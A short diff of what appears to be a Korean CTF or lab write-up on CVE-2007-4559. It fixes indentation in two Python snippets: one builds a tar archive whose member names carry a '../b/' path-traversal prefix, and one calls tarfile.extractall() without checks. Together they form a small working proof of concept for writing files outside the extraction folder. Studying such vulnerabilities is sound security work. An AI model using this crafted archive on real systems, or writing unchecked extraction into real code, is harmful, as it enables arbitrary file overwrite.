@@ -4,10 +4,10 @@ CVE-2007-4559 취약점을 활용하는 문제이다.
 
 ```python
 import tarfile
- def change_name(tarinfo):
+def change_name(tarinfo):
     tarinfo.name = "../b/" + tarinfo.name
     return tarinfo
- with tarfile.open("test.tar", "w:xz") as tar:
+with tarfile.open("test.tar", "w:xz") as tar:
     tar.add("test.txt", filter=change_name)
 ```
 
@@ -15,7 +15,7 @@ import tarfile
 
 ```python
 import tarfile
- with tarfile.open("test.tar", "r") as tar:
+with tarfile.open("test.tar", "r") as tar:
     tar.extractall()
 ```
 
